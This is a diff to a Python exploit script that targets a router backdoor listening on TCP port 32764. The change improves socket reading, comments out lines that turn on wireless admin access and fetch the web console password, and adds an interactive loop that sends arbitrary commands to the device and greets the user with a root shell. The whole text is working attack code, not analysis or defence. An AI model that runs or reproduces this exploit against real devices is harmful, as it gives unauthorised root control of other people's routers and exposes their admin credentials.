@@ -8,20 +8,37 @@ PORT = 32764
 def send_message(s, message, payload=''):
 	header = struct.pack('<III', 0x53634D4D, message, len(payload))
 	s.send(header+payload)
-	sig, ret_val, ret_len = struct.unpack('<III', s.recv(0xC))
+	r = s.recv(0xC)
+
+	while len(r) < 0xC:
+		tmp = s.recv(0xC - len(r))
+		assert len(tmp) != 0
+		r += tmp
+
+	sig, ret_val, ret_len = struct.unpack('<III', r)
 	assert(sig == 0x53634D4D)
+
 	if ret_val != 0:
 		return ret_val, "ERROR"
+
 	ret_str = ""
 	while len(ret_str) < ret_len:
-		ret_str += s.recv(ret_len - len(ret_str))
+		tmp = s.recv(ret_len - len(ret_str))
+		assert len(tmp) != 0
+		ret_str += tmp
+
 	return ret_val, ret_str
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
-send_message(s, 3, "wlan_mgr_enable=1")
-print send_message(s, 2, "http_password")[1]
+s.settimeout(1)
 
+# uncomment to turned on wireless access to the administration web console
+# send_message(s, 3, "wlan_mgr_enable=1")
+# uncomment to get the administration web console's password
+# print send_message(s, 2, "http_password")[1]
+
+print send_message(s, 7, 'echo "welcome, here is a root shell, have fun"')[1]
 while 1 :
 	print send_message(s, 7, sys.stdin.readline().strip('\n'))[1]
 
